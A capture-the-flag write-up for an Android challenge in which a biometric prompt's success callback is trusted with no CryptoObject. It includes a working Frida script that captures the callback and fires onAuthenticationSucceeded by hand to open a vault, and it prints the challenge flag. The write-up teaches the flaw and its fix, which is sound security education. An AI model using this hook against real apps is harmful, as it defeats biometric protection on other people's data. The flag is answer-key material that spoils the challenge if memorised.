---
id: "friendly-ctf-face-to-face"
title: "Face to Face"
category: "CTF Writeups"
date: "2026-09-27"
summary: "The biometric prompt's success callback is trusted client-side with no CryptoObject, so hooking it opens the vault with no fingerprint."
flag: "Securinets{n3v3r_ch3ck3d_y0ur_f4c3_2ebfa0af}"
tags:
  - "Mobile Security"
---

The button wants a fingerprint. The screen tells you to open the vault without giving one. Biometric prompts feel like a hard wall the first time you meet one, because it looks like the app is asking the hardware a question you cannot answer. It is not. The app is asking the *device* to run a fingerprint check and then trusting whatever the device tells it. And the device is yours.

## What you're looking at

This is a runtime challenge. You need a device or emulator with fingerprint hardware, `frida` or `objection` attached to the app, and the backend up, because the vault contents come from the server. Setup and backend details are in `Writeups/Securinets-Friendly-CTF-2026/HOSTING.md`.

The class is `tn.securinets.ctf.challenges.facetoface.FaceToFaceActivity`. Read it in `jadx` first.

## Finding the way in

Here is the part that matters, trimmed to the shape:

```kotlin
val biometricPrompt = BiometricPrompt(
    this,
    object : BiometricPrompt.AuthenticationCallback() {
        override fun onAuthenticationSucceeded(result: BiometricPrompt.AuthenticationResult) {
            onSuccess()          // -> openVault(...)
        }
        override fun onAuthenticationFailed() { onMessage("Not recognised.") }
        override fun onAuthenticationError(errorCode: Int, errString: CharSequence) {
            onMessage("Cancelled. Still locked.")
        }
    }
)
biometricPrompt.authenticate(promptInfo)
```

Two things are worth noticing. First, `onAuthenticationSucceeded` does not use `result` for anything — it just calls `onSuccess()`, which opens the vault. Second, and this is the real flaw, the prompt is built with no `CryptoObject`. A `CryptoObject` ties the biometric check to a real cryptographic operation — the app cannot proceed unless the hardware actually unlocked a key. Without it, "success" is just a method call, a boolean event the app chooses to believe. Nothing about opening the vault is cryptographically bound to a fingerprint having been presented.

So the vault opens the instant `onAuthenticationSucceeded` runs. You do not need to fool the sensor. You need to make that method fire, or call it yourself.

## The solve

The app even suggests where to start, in its own hint on the screen:

```bash
objection -g tn.securinets.ctf explore
```

With Frida, the clean approach is to grab the callback object the app hands to `BiometricPrompt`, then call its success method directly. The success handler ignores its `result` argument, so you can pass `null` and it still opens the vault.

```javascript
Java.perform(function () {
    var BP = Java.use('androidx.biometric.BiometricPrompt');

    // The app uses the (FragmentActivity, AuthenticationCallback) constructor.
    // Capture the callback instance as it is built.
    BP.$init.overload(
        'androidx.fragment.app.FragmentActivity',
        'androidx.biometric.BiometricPrompt$AuthenticationCallback'
    ).implementation = function (activity, callback) {
        console.log('[+] captured AuthenticationCallback: ' + callback);
        globalThis.capturedCallback = callback;   // keep it for the REPL
        return this.$init(activity, callback);
    };
});
```

Load that, tap **Unlock with fingerprint** once so the app builds the prompt and the constructor hook captures the callback, then from the Frida REPL fire success by hand:

```javascript
Java.perform(function () {
    globalThis.capturedCallback.onAuthenticationSucceeded(null);
});
```

`onAuthenticationSucceeded` runs, `onSuccess()` runs, the app calls the server for the vault contents, and the flag lands at the top of the screen:

```
Securinets{n3v3r_ch3ck3d_y0ur_f4c3_2ebfa0af}
```

A note on the emulator. If no fingerprint is enrolled, tapping the button shows a message and never builds the prompt, so enrol a fingerprint first (Settings, or `adb -e emu finger touch <id>` after enrolment) so the app reaches the biometric path — then the hook does the rest, and no real finger is ever needed.

Source is in `tn.securinets.ctf.challenges.facetoface` inside the APK; the packaged challenge is `Writeups/Securinets-Friendly-CTF-2026/mobile/app`.

## Why it works

Biometrics authenticate you to the *device*, not to the app's server. When the hardware confirms a fingerprint, all the app receives is a callback saying "that went fine." If the app gates access purely on that callback, it is trusting a signal that runs entirely on hardware the attacker controls, and anything running on your device can be hooked, replaced, or invoked directly with Frida.

The proper way to use a biometric prompt is to bind it to a `CryptoObject` — the fingerprint unlocks a key stored in the hardware keystore, and the sensitive operation can only complete with that key. Then a forged "success" gets you nothing, because there is no key without a real unlock. This is the insecure-authentication lesson from the OWASP Mobile Top 10: a check that runs only on the attacker's device, and produces only a boolean, is advisory. The missing `CryptoObject` is the whole vulnerability.

## Notes from building it

Do not read this as "add a CryptoObject to fix it" and think that is a footnote — its absence *is* the challenge. An earlier version of this screen had a worse bug: when the device had no fingerprint hardware, the code just opened the vault directly, which meant a stock emulator popped it in one tap with no tooling at all. That is the lesson bypassed by accident, so I rewrote the branch order to force the biometric path whenever hardware is present and to say plainly, with no hint about the technique, when it is not. The bypass should cost you a hook, not a lucky device.

## Beyond the challenge

Consider a document vault whose only lock is a callback that sets an `unlocked` boolean. Changing that callback can bypass the app's decision without defeating the fingerprint sensor. This is the distinction the challenge teaches: a successful-looking UI event is not the same thing as a protected cryptographic operation.

For suitable local secrets, Android supports binding authentication to a key operation through a [CryptoObject](https://developer.android.com/identity/sign-in/biometric-auth). Remote data also needs server-side authorization. An instrumented client saying “biometrics passed” should not, by itself, authorize an otherwise forbidden server operation.

## Keep learning

- [Hextree](https://www.hextree.io/courses): continue with Android security courses and hands-on exercises.
- [Frida JavaScript API](https://frida.re/docs/javascript-api/): practice replacing Java callbacks and inspecting their arguments.
- [OWASP Mobile Application Security Testing Guide](https://mas.owasp.org/MASTG/): continue with biometric authentication testing.
